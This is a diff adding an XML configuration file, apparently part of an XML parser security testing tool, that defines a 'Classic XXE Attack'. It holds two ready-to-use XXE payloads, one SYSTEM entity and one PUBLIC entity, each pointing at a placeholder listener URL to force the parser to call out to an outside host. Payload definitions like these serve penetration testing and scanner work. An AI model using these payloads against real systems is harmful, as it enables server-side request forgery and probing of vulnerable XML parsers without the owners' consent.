@@ -1,0 +1,25 @@
+<config>
+<name>Classic XXE Attack</name>
+<description>The idea of this attack is to force the parser to call arbitrary URLs.</description>
+<params>
+    <dosbox>false</dosbox>
+    <targetFile>false</targetFile>
+    <helperURL>false</helperURL>
+    <attackListenerURL>true</attackListenerURL>
+    <externalResources>false</externalResources>
+</params>
+<attackvectors>
+<attackvector type="system" default="true">
+<directMessage><![CDATA[<!DOCTYPE data [
+<!ENTITY dos SYSTEM "§tf_listenURL§" >
+]>
+<data>&dos;</data>]]></directMessage>
+</attackvector>
+<attackvector type="public">
+<directMessage><![CDATA[<!DOCTYPE data [
+<!ENTITY dos PUBLIC "p" "§tf_listenURL§" >
+]>
+<data>&dos;</data>]]></directMessage>
+</attackvector>
+</attackvectors>
+</config>
